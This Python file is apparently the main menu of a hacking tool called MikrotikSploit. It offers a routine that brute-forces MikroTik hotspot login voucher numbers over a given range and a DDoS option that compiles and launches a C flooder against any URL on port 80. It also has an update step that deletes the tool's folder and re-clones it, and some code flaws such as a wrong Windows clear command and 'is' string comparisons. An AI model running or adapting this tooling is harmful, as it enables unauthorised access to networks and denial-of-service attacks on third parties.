import re
import sys
import os
import time
import requests
import subprocess
from tools import asc, EX818M
from color import *
sys.path.append('core/bell/')
from bell import MAIN, write, cou
sys.path.append('core/Exploit/')
from find import MAC
from run import RUN

def CLEAR():
    if sys.platform.startswith("win") is True:
        os.system("clr")
    else:
        os.system("clear")


def URL_CLEAR(url):
    _RE_ = re.split(r"ht[a-z]p\:\/\/|/", url)
    if "http" in url:url = _RE_[1]
    elif "/" in url:url = _RE_[0]
    else:url = url
    return url


def timeS():
    s = time.ctime().replace(' ', ':').split(':')[3:6]
    m = f"[{s[0]}:{s[1]}:{s[2]}]"
    return m


def Inf():

    print(""" 
Name        : Nabil Syahnaufal
Facebook    : https://www.facebook.com/nabilsyahnauval.nabilsyahnauval.3/
Github      : https://github.com/Nabil-Syahnaufal
Version     : v0.1
info script : Tools Hacking Mikrotik & DDOS """)
    input(f"{WOW}\n\n++++++ (Enter) ++++++{N}")

    CLEAR()

def writeEr(u,i,x):
    open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                                               f" Error Getting Password Cards Page Login My Network\n{timeS()} Error "
                                               f"Url={u} Min Number={i} Max Number={x}")
class LOOP:
    def __init__(self):
        self._NUM_ = int()
        self.find = True
        self.find1 = True
        self.find2 = True
        self._S_ = EX818M()

    def EX_818(self):
        CLEAR()

        print(self._S_[0])

        url = input(f"{W}[{P} * {W}]{B} Masukan URL Page Login{N}: ")
        minnum = input(f"{W}[{P} * {W}]{B} Masukan the Min Number {N}: ")
        maxnum = input(f"{W}[{P} * {W}]{B} Masukan Max Number {N}: ")

        url = URL_CLEAR(url=url)

        try:

            MAIN().run(url,minnum,maxnum)

        except Exception as e:
            print(f"{W}[{R} - {W}]{B} Error url Atau Angka !!!\n{W}[{R} !!! {W}]{B} {e}")
            writeEr(url,minnum,maxnum)
            
        except requests.exceptions.ConnectionError as e:
            print(f"{W}[{R} - {W}]{B} Error url !!!!\n{W}[{R} !!! {W}]{B} {e}")


    def DDos(self):

        CLEAR()

        print(self._S_[1])

        url = input(f"{W}[{P} * {W}]{B} Masukan URL Untuk DoDs{N}: ")

        url = URL_CLEAR(url=url)

        write(f"{WOW} Please white .................{N}", 10)

        os.system("gcc -s ./core/DDoS/DDoS.c -o ./core/DDoS/DDoS")

        try:

            " %s " % os.system(f"./core/DDoS/DDoS {url} {80}")

        except OSError:
            open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                                               f" DDoS Untuk Jaringan Kamu\n{timeS()} Error "
                                               f"Url={url} Port={80}")

    def LOOPS(self):
        try:
            while True:
                self.find = True
                self.find1 = True
                self.find2 = True

                _ASC_ = asc()

                if _ASC_.strip() is "1":

                    self.EX_818()

                elif _ASC_.strip() is "2":

                    self.DDos()

                elif _ASC_.strip() is "3":

                    Inf()

                elif _ASC_.strip() is "4":
                    ASCY = input("[ {R}!{N} ] Yakin Remove MikrotikSploit dan UPDATE [Y/N]: ")

                    if ASCY.upper()[0] == "Y":
                        UB = os.system('cd ../&& rm -r MikrotikSploit && git clone https://github.com/Nabil-Syahnaufal/MikrotikDown.git')
                        if UB != 0x00:
                            print("[{R}!{N}] Error For UPDATE")
                            exit()
                        else:
                            print("[ {B}+{N} ] Done UPDATE !")
                            exit()

                    else:pass
                
                elif _ASC_.strip() is "5":
                    exit()

        except KeyboardInterrupt:
            CLEAR()

            self.LOOPS()
